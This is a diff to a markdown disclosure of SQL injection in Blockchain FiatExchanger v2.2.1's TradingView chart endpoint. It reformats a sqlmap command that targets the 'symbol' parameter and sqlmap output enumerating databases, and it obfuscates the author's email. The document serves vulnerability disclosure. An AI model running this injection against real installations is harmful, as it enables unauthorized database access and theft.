@@ -21,19 +21,20 @@ SQL injection attack has been discovered in Blockchain FiatExchanger v2.2.1 plat
 
 <br>
 
-Vulnerability File: /application/third_party/Chart/TradingView/chart_content/master.php line 130
-
+Vulnerability File:
+```sql
+/application/third_party/Chart/TradingView/chart_content/master.php line 130
+```
 <br>
 
 ### Sqlmap command:
-`
+```sql
 python sqlmap.py -u "http://http://vulnerable-host.com/application/third_party/Chart/TradingView/chart_content/master.php/history?from=1652675947&resolution=5&symbol=BTC-BCH" -p symbol --dbms=MySQL --banner --random-agent --current-db --dbs --current-user
-
-`
+```
 <br>
 
 ### output:
-`
+```sql
 [20:05:54] [INFO] fetched random HTTP User-Agent header value 'Opera/9.20(Windows NT 5.1; U; en)' from file '/root/sqlmap/data/txt/user-agents.txt'
 [20:05:55] [INFO] testing connection to the target URL
 [20:05:55] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
@@ -77,7 +78,7 @@ available databases [6]:
 [*] mysql
 [*] performance_schema
 
-`
+```
 <br>
 <img src="./resources/Blockchain-FiatExchanger-221-sqlmap1.png">
 <br>
@@ -98,6 +99,6 @@ available databases [6]:
 ```
 Mohamed N. Ali
 @MohamedNab1l
-ali.mohamed@gmail.com
+ali.mohamed[at]gmail.com
 
 ```
